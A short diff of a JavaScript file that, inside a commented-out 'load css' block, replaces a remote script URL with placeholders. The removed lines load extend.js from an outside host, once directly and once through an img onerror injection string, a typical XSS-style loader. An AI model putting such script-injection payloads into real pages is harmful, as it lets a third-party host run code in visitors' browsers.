@@ -1,7 +1,7 @@
 (function(){
     /* load css
-     var drc = document.createElement('script');drc.setAttribute("src","https://biluweb.github.io/assets/extend.js");document.getElementsByTagName('head')[0].appendChild(drc);
-     ["<img src=\"d\" onerror=\"var drc = document.createElement(\'script\');drc.setAttribute(\'src\',\'https://biluweb.github.io/assets/extend.js\');document.getElementsByTagName(\'head\')[0].appendChild(drc);\">"].join("");
+     var drc = document.createElement('script');drc.setAttribute("src","https://");document.getElementsByTagName('head')[0].appendChild(drc);
+     ["<img src=\"d\" onerror=\"var drc = document.createElement(\'script\');drc.setAttribute(\'src\',\'https://aa/extend.js\');document.getElementsByTagName(\'head\')[0].appendChild(drc);\">"].join("");
     */
     
     var meta = document.createElement('meta');
